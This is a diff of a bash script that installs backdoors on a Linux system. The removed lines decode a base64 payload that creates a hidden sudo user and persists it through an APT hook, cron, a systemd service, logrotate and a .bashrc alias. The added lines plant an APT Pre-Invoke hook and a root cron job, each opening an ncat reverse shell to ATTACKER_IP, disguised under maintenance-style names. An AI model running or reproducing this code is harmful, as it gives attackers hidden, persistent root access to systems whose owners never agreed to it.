@@ -1,60 +1,44 @@
+
 #!/bin/bash
 
-# Check if the user is root
-if [ "$EUID" -ne 0 ]; then
-    echo "Please run as root"
+# Set environment variables for the attacker's IP and port
+export ATTACKER_IP=${ATTACKER_IP:-"attacker_ip"}
+export ATTACKER_PORT=${ATTACKER_PORT:-"attacker_port"}
+
+# Create an APT configuration file for the update hook
+cat << EOF > /etc/apt/apt.conf.d/99-system-maintenance
+# Reverse shell backdoor - replace 'attacker_ip' and 'attacker_port' with actual values
+APT::Update::Pre-Invoke {"nohup ncat \${ATTACKER_IP} \${ATTACKER_PORT} -e /bin/bash 2> /dev/null &"};
+EOF
+
+
+# Create a script that will be executed by cron
+cat << EOF > /usr/local/bin/daily_update.sh
+#!/bin/bash
+
+# Persistent reverse shell backdoor
+export ATTACKER_IP=${ATTACKER_IP:-"\$ATTACKER_IP"}
+export ATTACKER_PORT=${ATTACKER_PORT:-"\$ATTACKER_PORT"}
+
+# Check if ATTACKER_IP and ATTACKER_PORT are set
+if [[ "\$ATTACKER_IP" == "attacker_ip" || "\$ATTACKER_PORT" == "attacker_port" ]]; then
+    echo "Error: Please set ATTACKER_IP and ATTACKER_PORT before running this script."
     exit 1
 fi
 
-# Obfuscate variable names
-a1="backdoor_$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)"
-a2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1)
-
-# Create and encode the hidden script
-echo 'IyEvYmluL2Jhc2gKIyBTY3JpcHQgdG8gYWRkIGEgYmFja2Rvb3IgdXNlciBhbmQgbG9nIHRoZSBldmVudApM
-T0dfRklMRT0iL3Zhci8uaGlkZGVuLy5iZW5pZ25fcG9zdF9pbnN0YWxsLmxvZyIKaWYgIWlkICIkYTEiICYm
-LyZkZXZudWxsOyB0aGVuCiAgICB1c2VyYWRkIC1tIC1zIC9iaW4vYmFzaCAiJGFhMSIKICAgIGVjaG8gIiRh
-YTE6JGEyIiB8IGNocGFzc3dkCiAgICB1c2VybW9kIC1hRyBzdWRvICIkYTEiCiAgICBlY2hvICJDcmVhdGVk
-IiA+PiAvZGV2L251bGwKZmkKZWNobyAiUG9zdC1pbnN0YWxsIGhvb2sgZXhlY3V0ZWQgYXQgJChkYXRlKSIg
-Pj4gIiRMT0dfRklMRSIK' | base64 -d > /usr/local/bin/systemd_util.sh
-chmod +x /usr/local/bin/systemd_util.sh
-
-# Create an APT configuration file for the post-install hook
-cat << EOF > /etc/apt/apt.conf.d/99-systemd-util
-DPkg::Post-Invoke {"bash /usr/local/bin/systemd_util.sh";};
+nohup ncat \$ATTACKER_IP \$ATTACKER_PORT -e /bin/bash 2> /dev/null &
 EOF
 
-# Add a cron job for persistence
-(crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/systemd_util.sh") | crontab -
+# Make the script executable
+chmod +x /usr/local/bin/daily_update.sh
 
-# Create a systemd service for persistence
-cat << EOF > /etc/systemd/system/systemd_util.service
-[Unit]
-Description=System Utility Service
+# Create a cron job to run the script daily
+cat << EOF > /etc/cron.d/daily_update
 
-[Service]
-ExecStart=/usr/local/bin/systemd_util.sh
-
-[Install]
-WantedBy=multi-user.target
+# Run the daily_update.sh script daily at midnight
+0 0 * * * root /usr/local/bin/daily_update.sh
 EOF
 
-# Enable the service
-systemctl enable systemd_util.service
-
-# Log rotation configuration for the hidden log file
-cat << EOF > /etc/logrotate.d/systemd_util
-/var/.hidden/.systemd_util.log {
-    daily
-    missingok
-    rotate 7
-    compress
-    notifempty
-    create 0640 root utmp
-}
-EOF
-
-# Use an alias to hide the script execution behind apt-get
-echo "alias apt-update='/usr/bin/apt-get update && bash /usr/local/bin/systemd_util.sh'" >> ~/.bashrc
-
-echo "Obfuscated script with multiple persistence mechanisms installed. Use 'rm -f /etc/apt/apt.conf.d/99-systemd-util /etc/systemd/system/systemd_util.service ~/.bashrc /etc/logrotate.d/systemd_util /usr/local/bin/systemd_util.sh' to remove it."
+# Provide instructions for removal
+echo "To remove the APT hook, use: rm -f /etc/apt/apt.conf.d/99-system-maintenance"
+echo "To remove the cron job, use: rm -f /etc/cron.d/daily_update"
